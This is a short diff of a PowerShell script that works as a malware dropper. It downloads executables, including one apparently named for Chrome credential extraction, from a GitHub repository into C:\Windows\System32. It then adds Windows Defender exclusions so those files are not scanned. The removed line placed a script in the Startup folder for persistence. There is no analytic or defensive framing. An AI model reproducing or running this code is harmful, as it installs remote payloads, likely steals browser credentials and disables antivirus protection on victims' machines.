@@ -2,7 +2,6 @@
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/N0b0dy.exe' -OutFile "C:\Windows\System32\N0b0dy.exe"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/ddrcc.ps1' -OutFile "C:\Windows\System32\ddrcc.ps1"
 Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/chromelevator_x64.exe' -OutFile "C:\Windows\System32\chromelevator_x64.exe"
-Invoke-WebRequest 'https://github.com/Kylerainer09/glowing-octo-computing-machine/raw/refs/heads/main/cleanup.ps1' -OutFile "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Startup\cleanup.ps1" 
 # add exlusion to files
 Add-MpPreference -ExclusionPath "C:\Windows\System32\N0b0dy.exe"
 Add-MpPreference -ExclusionPath "C:\Windows\System32\chromelevator_x64.exe"
